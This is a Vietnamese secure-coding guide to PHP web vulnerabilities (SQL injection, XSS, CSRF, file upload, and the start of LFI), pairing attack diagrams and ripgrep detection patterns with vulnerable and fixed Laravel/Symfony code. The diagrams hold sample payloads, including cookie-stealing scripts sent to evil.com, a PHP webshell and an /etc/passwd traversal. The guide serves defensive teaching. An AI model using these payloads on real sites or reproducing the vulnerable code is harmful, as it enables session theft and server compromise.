# Domain 02: Bảo Mật Web (Web Security)

**Lĩnh vực:** Bảo Mật Ứng Dụng Web
**Số lượng patterns:** 18
**Ngôn ngữ:** PHP (Laravel / Symfony)
**Cập nhật:** 2026-02-18

---

## Mục Lục

1. [SQL Injection](#1-sql-injection---critical)
2. [XSS - Stored](#2-xss---stored---critical)
3. [XSS - Reflected](#3-xss---reflected---critical)
4. [CSRF Token Thiếu](#4-csrf-token-thiếu---critical)
5. [File Upload Unrestricted](#5-file-upload-unrestricted---critical)
6. [Local File Inclusion (LFI)](#6-local-file-inclusion-lfi---critical)
7. [Remote File Inclusion (RFI)](#7-remote-file-inclusion-rfi---critical)
8. [Object Injection (Deserialization)](#8-object-injection-deserialization---critical)
9. [Command Injection](#9-command-injection---critical)
10. [Session Fixation](#10-session-fixation---critical)
11. [Session Hijacking](#11-session-hijacking---high)
12. [Directory Traversal](#12-directory-traversal---critical)
13. [XML External Entity (XXE)](#13-xml-external-entity-xxe---critical)
14. [SSRF](#14-ssrf---high)
15. [Open Redirect](#15-open-redirect---medium)
16. [Mass Assignment](#16-mass-assignment---high)
17. [Insecure Direct Object Reference (IDOR)](#17-insecure-direct-object-reference-idor---high)
18. [Header Injection](#18-header-injection---high)

---

## 1. SQL Injection - CRITICAL

### 1. Tên
**SQL Injection** (Chèn Mã SQL)

### 2. Phân loại
Bảo Mật Web / Lỗ Hổng Database / Input Validation

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Có thể dẫn đến lộ toàn bộ dữ liệu, xóa database, leo thang đặc quyền, thậm chí RCE qua `xp_cmdshell` (MSSQL) hoặc `INTO OUTFILE` (MySQL).

### 4. Vấn đề
SQL Injection xảy ra khi dữ liệu đầu vào từ người dùng được nhúng trực tiếp vào câu truy vấn SQL mà không qua xử lý. Kẻ tấn công có thể thao túng logic truy vấn để: đọc dữ liệu nhạy cảm, bypass xác thực, sửa/xóa dữ liệu, hoặc thực thi lệnh hệ điều hành.

```
LUỒNG TẤN CÔNG SQL INJECTION
==============================

Kẻ tấn công                 Ứng dụng PHP              Database (MySQL)
     │                            │                           │
     │  GET /users?id=1           │                           │
     │  ' OR '1'='1              │                           │
     │──────────────────────────>│                           │
     │                            │  Ghép chuỗi trực tiếp    │
     │                            │  "SELECT * FROM users     │
     │                            │   WHERE id=1 OR '1'='1'" │
     │                            │──────────────────────────>│
     │                            │                           │ Điều kiện
     │                            │                           │ luôn TRUE
     │                            │   Trả về TOÀN BỘ bảng   │
     │                            │<──────────────────────────│
     │   Nhận dữ liệu tất cả     │                           │
     │   users trong hệ thống    │                           │
     │<──────────────────────────│                           │
     │                            │                           │

BLIND SQL INJECTION (không có output hiển thị):
  Payload: id=1 AND SLEEP(5)  → đo thời gian phản hồi
  Payload: id=1 AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'
```

### 5. Phát hiện trong mã nguồn

**Dấu hiệu nguy hiểm:**
- Ghép chuỗi SQL với biến `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`
- Dùng `mysql_query()`, `mysqli_query()` với chuỗi nối trực tiếp
- Không dùng PDO prepared statements hoặc Query Builder

**Regex patterns (dùng với ripgrep):**

```bash
# Tìm ghép chuỗi SQL trực tiếp với biến request
rg --type php "SELECT.*\\\$_(GET|POST|REQUEST|COOKIE|SERVER)" -n

# Tìm mysql_query với biến
rg --type php "mysql(i)?_query\s*\(\s*[\"'].*\\\$" -n

# Tìm DB::statement với string concat
rg --type php "DB::(statement|select|insert|update|delete)\s*\(\s*[\"'].*\\\$" -n

# Tìm raw queries trong Laravel
rg --type php "->whereRaw\s*\(.*\\\$_(GET|POST|REQUEST)" -n

# Tìm PDO exec trực tiếp (không prepare)
rg --type php "\\\$pdo->(exec|query)\s*\(\s*[\"'].*\\\$" -n
```

### 6. Giải pháp

| Cách tiếp cận | Mức độ an toàn | Ghi chú |
|---|---|---|
| Ghép chuỗi SQL trực tiếp | ❌ Nguy hiểm | Không bao giờ dùng |
| `addslashes()` / `mysql_escape_string()` | ❌ Không đủ | Có thể bypass |
| `mysqli_real_escape_string()` | ⚠️ Tạm chấp nhận | Dễ quên, cần connection |
| PDO Prepared Statements | ✅ An toàn | Nên dùng |
| Eloquent ORM / Query Builder | ✅ An toàn | Laravel best practice |
| Stored Procedures (có tham số) | ✅ An toàn | Với parameterized input |

```php
<?php
// ============================================================
// VULNERABLE - SQL Injection
// ============================================================
// Thuần PHP - nguy hiểm
$id = $_GET['id'];
$result = mysql_query("SELECT * FROM users WHERE id = $id");

// Laravel - raw query với ghép chuỗi
$users = DB::select("SELECT * FROM users WHERE email = '" . $email . "'");

// Eloquent whereRaw không an toàn
$users = User::whereRaw("name = '$name'")->get();

// ============================================================
// SECURE - Prepared Statements / ORM
// ============================================================

// PDO Prepared Statement (PHP thuần)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id AND status = :status");
$stmt->execute([':id' => $id, ':status' => 'active']);
$users = $stmt->fetchAll(PDO::FETCH_ASSOC);

// Laravel Query Builder (tự động parameterize)
$users = DB::table('users')
    ->where('email', $email)
    ->where('status', 'active')
    ->get();

// Laravel Eloquent ORM
$user = User::where('id', $id)->firstOrFail();

// Laravel whereRaw AN TOÀN (dùng binding)
$users = User::whereRaw('YEAR(created_at) = ?', [$year])->get();

// Laravel với nhiều điều kiện phức tạp
$users = User::query()
    ->when($request->search, function ($q, $search) {
        $q->where('name', 'like', '%' . $search . '%');
    })
    ->when($request->role, fn($q, $role) => $q->where('role', $role))
    ->paginate(20);

// Symfony Doctrine QueryBuilder
$qb = $em->createQueryBuilder();
$users = $qb->select('u')
    ->from(User::class, 'u')
    ->where('u.email = :email')
    ->setParameter('email', $email)
    ->getQuery()
    ->getResult();
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Không bao giờ ghép chuỗi SQL với input người dùng
- [ ] Luôn dùng prepared statements hoặc ORM
- [ ] Validate và whitelist input trước khi dùng trong query
- [ ] Giới hạn quyền DB user (chỉ SELECT/INSERT/UPDATE cần thiết)
- [ ] Bật WAF (Web Application Firewall) ở tầng infrastructure
- [ ] Dùng `LIMIT` trong các query để hạn chế data leak
- [ ] Log và monitor các query bất thường

**PHPStan / Psalm rules:**
```yaml
# phpstan.neon
parameters:
  level: 8
  # Cài phpstan-dba để detect SQL injection
  # composer require --dev staabm/phpstan-dba
```

```bash
# Psalm plugin
composer require --dev psalm/plugin-laravel
vendor/bin/psalm --show-info=true
```

**OWASP References:**
- OWASP Top 10: A03:2021 – Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- https://owasp.org/www-community/attacks/SQL_Injection

---

## 2. XSS - Stored - CRITICAL

### 1. Tên
**Cross-Site Scripting - Stored** (XSS Lưu Trữ / XSS Bền Vững)

### 2. Phân loại
Bảo Mật Web / Client-Side Attack / Output Encoding

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Script độc hại được lưu vào database và thực thi với mọi người dùng truy cập trang, có thể đánh cắp session cookie, thực hiện hành động thay người dùng, hoặc phát tán malware.

### 4. Vấn đề
Stored XSS (hay Persistent XSS) xảy ra khi ứng dụng lưu input chưa được sanitize vào database, sau đó render lại lên HTML mà không encode. Khác với Reflected XSS, payload chỉ cần inject một lần và ảnh hưởng tất cả người dùng xem nội dung đó.

```
LUỒNG TẤN CÔNG STORED XSS
===========================

Kẻ tấn công                Ứng dụng PHP           Database        Nạn nhân
     │                          │                      │               │
     │  POST /comments           │                      │               │
     │  body="<script>           │                      │               │
     │   fetch('evil.com/       │                      │               │
     │   ?c='+document.cookie)  │                      │               │
     │  </script>"              │                      │               │
     │─────────────────────────>│                      │               │
     │                          │  INSERT INTO comments│               │
     │                          │  (body) VALUES (?)   │               │
     │                          │─────────────────────>│               │
     │                          │                      │  Lưu payload  │
     │                          │                      │  vào DB       │
     │                          │                      │               │
     │  (sau này...)            │                      │               │
     │                          │                      │    GET /page  │
     │                          │                      │<──────────────│
     │                          │  SELECT body FROM... │               │
     │                          │<─────────────────────│               │
     │                          │  Render HTML không   │               │
     │                          │  encode payload      │               │
     │                          │──────────────────────────────────────>│
     │                          │                      │   Script chạy │
     │  evil.com nhận cookie   │                      │   trên browser│
     │<─────────────────────────────────────────────────────────────────│
```

### 5. Phát hiện trong mã nguồn

**Dấu hiệu nguy hiểm:**
- Echo biến trực tiếp trong HTML không qua `htmlspecialchars()`
- Blade template dùng `{!! !!}` thay vì `{{ }}`
- Twig/Smarty dùng `|raw` filter không cần thiết
- `innerHTML` trong JavaScript nhận dữ liệu từ server

**Regex patterns:**

```bash
# Tìm echo biến trực tiếp (không encode)
rg --type php "echo\s+\\\$_(GET|POST|REQUEST|COOKIE|SESSION)" -n

# Tìm Blade unescaped output {!! !!}
rg --type php "\{!!\s*\\\$" -n

# Tìm print_r/var_dump trong production code
rg --type php "(print_r|var_dump)\s*\(\s*\\\$_(GET|POST)" -n

# Tìm echo với biến từ database (không encode)
rg --type php "echo\s+\\\$row\[" -n
rg --type php "echo\s+\\\$(user|comment|post|data)\b" -n

# Tìm innerHTML assignment với data từ PHP
rg "innerHTML\s*=.*\<\?php" -n
```

### 6. Giải pháp

| Output Context | Cách encode đúng | Ví dụ |
|---|---|---|
| HTML content | `htmlspecialchars()` | `<?= htmlspecialchars($name) ?>` |
| HTML attribute | `htmlspecialchars()` với quotes | `htmlspecialchars($val, ENT_QUOTES)` |
| JavaScript string | `json_encode()` | `var x = <?= json_encode($data) ?>` |
| URL parameter | `urlencode()` | `href="?id=<?= urlencode($id) ?>"` |
| CSS value | Whitelist only | Chỉ cho phép giá trị định nghĩa trước |

```php
<?php
// ============================================================
// VULNERABLE - Stored XSS
// ============================================================

// PHP thuần - echo trực tiếp từ DB
$comment = $db->query("SELECT body FROM comments WHERE id=$id")->fetch();
echo "<div>" . $comment['body'] . "</div>"; // XSS nếu body chứa script

// Laravel Blade - unescaped output
// resources/views/comments/show.blade.php
// {!! $comment->body !!}  <-- NGUY HIỂM

// ============================================================
// SECURE - Output Encoding
// ============================================================

// PHP thuần - luôn encode khi output HTML
echo "<div>" . htmlspecialchars($comment['body'], ENT_QUOTES | ENT_HTML5, 'UTF-8') . "</div>";

// Laravel Blade - dùng {{ }} (tự động escape)
// {{ $comment->body }}  <-- AN TOÀN (Blade tự gọi e() / htmlspecialchars)

// Khi THỰC SỰ cần render HTML (ví dụ: markdown đã parse)
// Dùng HTMLPurifier hoặc League\CommonMark
use Purifier;
echo "<div>" . Purifier::clean($comment->body) . "</div>";

// Laravel với HTMLPurifier (composer require mews/purifier)
// Trong model - mutator để sanitize khi lưu
class Comment extends Model
{
    public function setBodyAttribute(string $value): void
    {
        // Sanitize HTML khi lưu vào DB, không phải khi output
        $this->attributes['body'] = clean($value); // HTMLPurifier
    }
}

// Symfony Twig - mặc định auto-escape
// {{ comment.body }}  <-- AN TOÀN (Twig tự escape)
// {{ comment.body|raw }}  <-- NGUY HIỂM, chỉ dùng khi đã sanitize

// Content Security Policy header (thêm lớp bảo vệ)
// Trong Laravel middleware:
class SecurityHeaders
{
    public function handle(Request $request, \Closure $next): Response
    {
        $response = $next($request);
        $response->headers->set(
            'Content-Security-Policy',
            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
        );
        return $response;
    }
}
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Luôn encode output theo context (HTML, JS, URL, CSS)
- [ ] Dùng Blade `{{ }}` thay vì `{!! !!}` trừ khi đã sanitize
- [ ] Cài HTMLPurifier nếu cần render rich text từ user
- [ ] Thiết lập Content Security Policy header
- [ ] Bật HttpOnly flag cho session cookie
- [ ] Validate input: loại bỏ hoặc encode các ký tự đặc biệt HTML
- [ ] Code review tất cả chỗ dùng `{!! !!}` hoặc `echo $var`

**OWASP References:**
- OWASP Top 10: A03:2021 – Injection
- CWE-79: Improper Neutralization of Input During Web Page Generation
- https://owasp.org/www-community/attacks/xss/

---

## 3. XSS - Reflected - CRITICAL

### 1. Tên
**Cross-Site Scripting - Reflected** (XSS Phản Chiếu)

### 2. Phân loại
Bảo Mật Web / Client-Side Attack / Output Encoding

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Payload được nhúng trong URL và reflect lại ngay lập tức, phân phối qua email phishing hoặc link độc, đánh cắp session hoặc thực hiện hành động thay người dùng.

### 4. Vấn đề
Reflected XSS xảy ra khi ứng dụng đọc input từ HTTP request (thường từ URL parameter) và phản chiếu lại trực tiếp lên trang HTML mà không encode. Payload không được lưu trữ - nó "phản chiếu" qua server response.

```
LUỒNG TẤN CÔNG REFLECTED XSS
===============================

Kẻ tấn công                          Nạn nhân                  Ứng dụng PHP
     │                                    │                           │
     │  Tạo URL độc hại:                  │                           │
     │  https://app.com/search            │                           │
     │  ?q=<script>document.location=     │                           │
     │  'evil.com/?c='+document.cookie    │                           │
     │  </script>                         │                           │
     │                                    │                           │
     │  Gửi link qua email/chat ─────────>│                           │
     │                                    │  Click link               │
     │                                    │──────────────────────────>│
     │                                    │                           │  echo "Kết quả
     │                                    │                           │  cho: " . $_GET['q']
     │                                    │  Nhận HTML có script ─────│
     │                                    │<──────────────────────────│
     │                                    │  Script chạy trong        │
     │                                    │  browser nạn nhân         │
     │  Nhận cookie nạn nhân             │                           │
     │<───────────────────────────────────│                           │
```

### 5. Phát hiện trong mã nguồn

**Regex patterns:**

```bash
# Tìm echo $_GET/$_POST không qua htmlspecialchars
rg --type php "echo\s+\\\$_(GET|POST|REQUEST)\[" -n

# Tìm print với request variables
rg --type php "print\s+\\\$_(GET|POST|REQUEST)" -n

# Tìm biến được gán từ request rồi echo ngay
rg --type php "\\\$(search|query|q|keyword|term|name)\s*=\s*\\\$_(GET|POST)" -n -A3

# Tìm format string với request data
rg --type php "sprintf.*\\\$_(GET|POST|REQUEST)" -n

# Tìm heredoc với request variables
rg --type php "<<<.*\n.*\\\$_(GET|POST)" --multiline -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - Reflected XSS
// ============================================================
$search = $_GET['q'];
echo "<h2>Kết quả tìm kiếm cho: $search</h2>"; // XSS

// Cũng nguy hiểm - chỉ escape một phần
$search = strip_tags($_GET['q']); // strip_tags không đủ
echo "<h2>Kết quả: $search</h2>";

// Lỗi phổ biến - encode sai loại
$search = urldecode($_GET['q']);
echo "<h2>Kết quả: $search</h2>"; // urldecode ≠ htmlspecialchars

// ============================================================
// SECURE
// ============================================================

// PHP thuần
$search = $_GET['q'] ?? '';
$safeSearch = htmlspecialchars($search, ENT_QUOTES | ENT_HTML5, 'UTF-8');
echo "<h2>Kết quả tìm kiếm cho: {$safeSearch}</h2>";

// Khi dùng trong attribute HTML
echo '<input type="text" value="' . htmlspecialchars($search, ENT_QUOTES | ENT_HTML5, 'UTF-8') . '">';

// Khi output vào JavaScript context
echo '<script>var searchTerm = ' . json_encode($search, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT) . ';</script>';

// Laravel - Request validation + Blade
class SearchController extends Controller
{
    public function search(Request $request): View
    {
        $request->validate([
            'q' => ['nullable', 'string', 'max:255'],
        ]);

        $query = $request->input('q', '');
        $results = Product::where('name', 'like', '%' . $query . '%')->get();

        // Truyền raw string sang view, Blade tự escape với {{ }}
        return view('search.results', compact('query', 'results'));
    }
}

// resources/views/search/results.blade.php
// <h2>Kết quả cho: {{ $query }}</h2>  <-- AN TOÀN
// <input type="text" value="{{ $query }}">  <-- AN TOÀN

// Symfony - Twig auto-escapes by default
// {{ query }}  <-- AN TOÀN trong Twig
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Encode tất cả output từ request parameters
- [ ] Phân biệt rõ encoding theo context: HTML, attribute, JS, URL
- [ ] Thiết lập `X-XSS-Protection: 1; mode=block` header (legacy browsers)
- [ ] Thiết lập Content Security Policy
- [ ] Không tin tưởng `strip_tags()` như một biện pháp bảo mật hoàn toàn
- [ ] Validate kiểu dữ liệu: nếu cần số thì ép kiểu `(int)$_GET['id']`

**OWASP References:**
- CWE-79: Improper Neutralization of Input During Web Page Generation
- https://owasp.org/www-project-top-ten/

---

## 4. CSRF Token Thiếu - CRITICAL

### 1. Tên
**Cross-Site Request Forgery - CSRF Token Thiếu** (Giả Mạo Yêu Cầu Liên Trang)

### 2. Phân loại
Bảo Mật Web / Authentication & Session / Request Forgery

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Kẻ tấn công có thể thực hiện hành động thay mặt người dùng đã đăng nhập: chuyển tiền, đổi email/password, xóa tài khoản mà nạn nhân không hay biết.

### 4. Vấn đề
CSRF xảy ra khi ứng dụng không xác minh rằng request đến từ chính ứng dụng (không phải từ trang web của kẻ tấn công). Browser tự động gửi cookie theo mọi request đến domain, nên kẻ tấn công chỉ cần dụ người dùng vào trang của họ.

```
LUỒNG TẤN CÔNG CSRF
====================

Nạn nhân (đã login bank.com)    evil.com           bank.com
           │                        │                   │
           │  Truy cập evil.com      │                   │
           │───────────────────────>│                   │
           │                        │  Trả về trang có: │
           │                        │  <form action=    │
           │                        │  "bank.com/transfer"│
           │                        │  method="POST">   │
           │                        │  <input name="to" │
           │                        │  value="attacker">│
           │                        │  <input name="amt"│
           │                        │  value="5000000"> │
           │                        │  Auto-submit JS   │
           │<───────────────────────│                   │
           │                        │                   │
           │  POST /transfer (kèm cookie bank.com tự động)
           │──────────────────────────────────────────>│
           │                        │                   │ Không check CSRF
           │                        │                   │ → Chuyển tiền!
           │                        │                   │
           │  Chuyển tiền thành công│                   │
           │<──────────────────────────────────────────│
```

### 5. Phát hiện trong mã nguồn

**Regex patterns:**

```bash
# Tìm form POST không có CSRF token field
rg --type php "<form.*method=[\"']?post" -i -n

# Tìm route không có CSRF middleware trong Laravel
rg --type php "Route::(post|put|patch|delete).*withoutMiddleware" -n

# Tìm VerifyCsrfToken exclude list
rg --type php "protected \\\$except" -n

# Tìm ajax request không gửi CSRF header
rg "axios\.(post|put|patch|delete)" -n
rg "fetch.*method.*POST" -n

# Tìm API routes có thể thiếu CSRF (nếu không dùng token auth)
rg --type php "Route::post.*api" -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - Không có CSRF protection
// ============================================================

// PHP thuần - form không có token
// <form method="POST" action="/transfer">
//   <input name="to" value="">
//   <input name="amount" value="">
//   <button>Chuyển</button>
// </form>

// Xử lý không check token
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $to = $_POST['to'];
    $amount = $_POST['amount'];
    transferMoney($to, $amount); // CSRF vulnerability!
}

// ============================================================
// SECURE - CSRF Token Implementation
// ============================================================

// PHP thuần - tự implement CSRF token
session_start();

function generateCsrfToken(): string
{
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function validateCsrfToken(): bool
{
    $token = $_POST['_token'] ?? $_SERVER['HTTP_X_CSRF_TOKEN'] ?? '';
    return hash_equals($_SESSION['csrf_token'] ?? '', $token);
}

// Trong form:
// <input type="hidden" name="_token" value="<?= generateCsrfToken() ?>">

// Xử lý POST:
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!validateCsrfToken()) {
        http_response_code(403);
        die('CSRF token không hợp lệ');
    }
    // Tiếp tục xử lý...
}

// ============================================================
// LARAVEL - CSRF tự động qua middleware
// ============================================================

// app/Http/Kernel.php - VerifyCsrfToken đã có sẵn trong web middleware group
// Chỉ cần đảm bảo routes nằm trong web group

// Blade template - tự động
// <form method="POST" action="/transfer">
//     @csrf
//     ...
// </form>

// AJAX với Axios - Laravel tự động đọc XSRF-TOKEN cookie
// axios.defaults.headers.common['X-XSRF-TOKEN'] đã được set tự động

// Nếu dùng fetch():
// const token = document.querySelector('meta[name="csrf-token"]').content;
// fetch('/api/transfer', {
//     method: 'POST',
//     headers: { 'X-CSRF-TOKEN': token },
//     body: JSON.stringify(data)
// });

// Trong layout blade:
// <meta name="csrf-token" content="{{ csrf_token() }}">

// API routes (Stateless) - dùng Sanctum hoặc JWT thay CSRF
// routes/api.php sử dụng token-based auth, không cần CSRF
use Laravel\Sanctum\Http\Middleware\EnsureFrontendRequestsAreStateful;

// ============================================================
// SYMFONY - CSRF protection
// ============================================================
use Symfony\Component\Security\Csrf\CsrfTokenManagerInterface;

class TransferController extends AbstractController
{
    public function __construct(
        private CsrfTokenManagerInterface $csrfTokenManager
    ) {}

    #[Route('/transfer', methods: ['POST'])]
    public function transfer(Request $request): Response
    {
        $token = $request->request->get('_token');
        if (!$this->isCsrfTokenValid('transfer', $token)) {
            throw new AccessDeniedException('CSRF token không hợp lệ');
        }
        // Tiếp tục...
    }
}

// Twig form:
// <input type="hidden" name="_token" value="{{ csrf_token('transfer') }}">
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Bật VerifyCsrfToken middleware cho tất cả web routes
- [ ] Dùng `@csrf` directive trong mọi Blade form POST/PUT/DELETE
- [ ] Cho API stateless: dùng token-based auth (JWT/Sanctum), không cần CSRF
- [ ] Thiết lập `SameSite=Strict` hoặc `SameSite=Lax` cho session cookie
- [ ] Kiểm tra `Origin` và `Referer` header như lớp bảo vệ bổ sung
- [ ] Không expose CSRF token trong URL parameters

**OWASP References:**
- OWASP Top 10: A01:2021 – Broken Access Control
- CWE-352: Cross-Site Request Forgery (CSRF)
- https://owasp.org/www-community/attacks/csrf

---

## 5. File Upload Unrestricted - CRITICAL

### 1. Tên
**Unrestricted File Upload** (Upload File Không Kiểm Soát)

### 2. Phân loại
Bảo Mật Web / File Handling / Remote Code Execution

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Kẻ tấn công upload PHP webshell, sau đó thực thi code tùy ý trên server, dẫn đến chiếm quyền điều khiển toàn bộ server.

### 4. Vấn đề
Lỗ hổng upload file xảy ra khi ứng dụng không kiểm tra nghiêm ngặt loại file được upload. Kẻ tấn công có thể upload file PHP (webshell) ngụy trang là ảnh hoặc PDF, sau đó truy cập URL của file đó để thực thi lệnh hệ thống.

```
LUỒNG TẤN CÔNG FILE UPLOAD
============================

Kẻ tấn công                    Ứng dụng PHP                  Server
     │                               │                            │
     │  POST /upload                 │                            │
     │  filename: avatar.php.jpg     │                            │
     │  content-type: image/jpeg     │                            │
     │  body: <?php system($_GET['c'])?>
     │──────────────────────────────>│                            │
     │                               │  Kiểm tra: extension .jpg  │
     │                               │  ✓ Cho phép!              │
     │                               │  Lưu vào /uploads/         │
     │                               │──────────────────────────>│
     │                               │                            │
     │  GET /uploads/avatar.php.jpg?c=id
     │──────────────────────────────────────────────────────────>│
     │                               │                            │ Apache/Nginx
     │                               │                            │ interpret as PHP
     │                               │                            │ uid=33(www-data)
     │  Nhận kết quả lệnh hệ thống  │                            │
     │<──────────────────────────────────────────────────────────│
```

### 5. Phát hiện trong mã nguồn

**Regex patterns:**

```bash
# Tìm move_uploaded_file không có validation đầy đủ
rg --type php "move_uploaded_file" -n -A5

# Tìm chỉ check extension (không check MIME)
rg --type php "pathinfo.*PATHINFO_EXTENSION" -n -B2 -A5

# Tìm chỉ check content-type từ request (dễ fake)
rg --type php "\\\$_FILES\[.*\]\[.type.\]" -n

# Tìm upload path trong web root
rg --type php "move_uploaded_file.*public|uploads|www" -n

# Tìm không rename file (giữ nguyên tên gốc)
rg --type php "\\\$_FILES\[.*\]\[.name.\].*move_uploaded_file" -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - Upload không kiểm soát
// ============================================================
$file = $_FILES['avatar'];
$ext = pathinfo($file['name'], PATHINFO_EXTENSION);

// Sai: chỉ check extension (kẻ tấn công đặt tên evil.php.jpg)
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
if (in_array($ext, $allowed)) {
    move_uploaded_file($file['tmp_name'], "uploads/" . $file['name']);
    // Giữ tên gốc → kẻ tấn công biết đường dẫn
    // Upload vào web root → có thể execute
}

// ============================================================
// SECURE - Kiểm tra toàn diện
// ============================================================

class FileUploadService
{
    private const ALLOWED_MIME_TYPES = [
        'image/jpeg' => 'jpg',
        'image/png'  => 'png',
        'image/gif'  => 'gif',
        'image/webp' => 'webp',
    ];

    private const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

    public function uploadAvatar(UploadedFile $file): string
    {
        // 1. Kiểm tra kích thước
        if ($file->getSize() > self::MAX_FILE_SIZE) {
            throw new \InvalidArgumentException('File quá lớn (tối đa 5MB)');
        }

        // 2. Kiểm tra MIME type thực sự (đọc file header, không tin content-type)
        $finfo = new \finfo(FILEINFO_MIME_TYPE);
        $mimeType = $finfo->file($file->getRealPath());

        if (!array_key_exists($mimeType, self::ALLOWED_MIME_TYPES)) {
            throw new \InvalidArgumentException('Loại file không được phép: ' . $mimeType);
        }

        // 3. Kiểm tra file ảnh thực sự (không phải PHP ngụy trang)
        $imageInfo = @getimagesize($file->getRealPath());
        if ($imageInfo === false) {
            throw new \InvalidArgumentException('File không phải ảnh hợp lệ');
        }

        // 4. Tạo tên file ngẫu nhiên (không giữ tên gốc)
        $newFilename = sprintf(
            '%s_%s.%s',
            uniqid('avatar_', true),
            bin2hex(random_bytes(8)),
            self::ALLOWED_MIME_TYPES[$mimeType]
        );

        // 5. Lưu NGOÀI web root
        $storagePath = storage_path('app/uploads/avatars/'); // Không trong public/
        if (!is_dir($storagePath)) {
            mkdir($storagePath, 0755, true);
        }

        // 6. Di chuyển file an toàn
        $file->move($storagePath, $newFilename);

        // 7. (Tùy chọn) Strip metadata và reprocess ảnh
        $this->reprocessImage($storagePath . $newFilename);

        return $newFilename;
    }

    private function reprocessImage(string $path): void
    {
        // Dùng GD hoặc Imagick để re-encode ảnh
        // Loại bỏ mọi payload PHP ẩn trong metadata
        $image = imagecreatefromstring(file_get_contents($path));
        if ($image !== false) {
            imagejpeg($image, $path, 85);
            imagedestroy($image);
        }
    }
}

// Laravel Controller
class AvatarController extends Controller
{
    public function store(Request $request, FileUploadService $uploadService): JsonResponse
    {
        $request->validate([
            'avatar' => [
                'required',
                'file',
                'image',           // Laravel check: jpeg,png,bmp,gif,svg,webp
                'mimes:jpg,jpeg,png,webp',  // Whitelist MIME
                'max:5120',        // 5MB trong KB
                'dimensions:min_width=100,min_height=100,max_width=2000,max_height=2000',
            ],
        ]);

        $filename = $uploadService->uploadAvatar($request->file('avatar'));

        // Phục vụ file qua controller, không expose path trực tiếp
        auth()->user()->update(['avatar' => $filename]);

        return response()->json(['avatar_url' => route('avatar.show', $filename)]);
    }
}

// Route phục vụ file qua PHP (kiểm tra auth trước)
class AvatarShowController extends Controller
{
    public function __invoke(string $filename): Response
    {
        // Validate filename (không để path traversal)
        if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $filename)) {
            abort(404);
        }

        $path = storage_path('app/uploads/avatars/' . $filename);
        if (!file_exists($path)) {
            abort(404);
        }

        return response()->file($path);
    }
}
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Kiểm tra MIME type thực sự bằng `finfo`, không tin `$_FILES['type']`
- [ ] Dùng `getimagesize()` để xác nhận file ảnh hợp lệ
- [ ] Rename file thành tên ngẫu nhiên (UUID/random), bỏ extension nguyên gốc
- [ ] Lưu file ngoài web root, phục vụ qua PHP controller
- [ ] Cấu hình web server không execute PHP trong thư mục upload
- [ ] Re-process ảnh với GD/Imagick để strip metadata và payload
- [ ] Giới hạn kích thước file
- [ ] Scan virus với ClamAV nếu có

**OWASP References:**
- OWASP Top 10: A04:2021 – Insecure Design
- CWE-434: Unrestricted Upload of File with Dangerous Type
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

---

## 6. Local File Inclusion (LFI) - CRITICAL

### 1. Tên
**Local File Inclusion** (Nhúng File Cục Bộ)

### 2. Phân loại
Bảo Mật Web / File Handling / Code Execution

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Kẻ tấn công đọc file nhạy cảm trên server (`/etc/passwd`, `.env`, source code), hoặc kết hợp với log poisoning để thực thi code tùy ý.

### 4. Vấn đề
LFI xảy ra khi ứng dụng dùng input người dùng trong hàm `include()`, `require()`, `include_once()`, `require_once()` mà không validate. Kẻ tấn công dùng path traversal (`../`) để trỏ đến file hệ thống.

```
LUỒNG TẤN CÔNG LFI
===================

Kẻ tấn công                           Ứng dụng PHP              File System
     │                                      │                          │
     │  GET /page?template=../../../../etc/passwd
     │──────────────────────────────────────>│                          │
     │                                      │  include("templates/"     │
     │                                      │  . $_GET['template'])     │
     │                                      │                           │
     │                                      │  = "templates/../../../../│
     │                                      │    etc/passwd"            │
     │                                      │───────────────────────────>│
     │                                      │                           │ Đọc /etc/passwd
     │                                      │<───────────────────────────│
     │  root:x:0:0:root:/root:/bin/bash     │                           │
     │  www-data:x:33:33:...               │                           │
     │<──────────────────────────────────────│                           │
     │                                      │                           │
     │  LOG POISONING (RCE):                │                           │
     │  1. Inject PHP vào User-Agent        │                           │
     │  2. Server log: <?php system($_GET['c'])?>
     │  3. GET /page?template=../../../../var/log/apache2/access.log&c=id
     │  → Thực thi code!                   │                           │
```

### 5. Phát hiện trong mã nguồn

**Regex patterns:**

```bash
# Tìm include/require với biến từ request
rg --type php "(include|require)(_once)?\s*\(\s*.*\\\$_(GET|POST|REQUEST|COOKIE)" -n

# Tìm biến được assign từ request rồi include
rg --type php "(include|require)(_once)?\s*\(\s*\\\$" -n -B5

# Tìm file_get_contents với path từ user
rg --type php "file_get_contents\s*\(\s*\\\$_(GET|POST|REQUEST)" -n

# Tìm readfile với user input
rg --type php "readfile\s*\(\s*\\\$_(GET|POST|REQUEST)" -n

# Tìm fopen với user-controlled path
rg --type php "fopen\s*\(\s*\\\$_(GET|POST|REQUEST|COOKIE)" -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - LFI
// ============================================================
$template = $_GET['template']; // "../../etc/passwd"
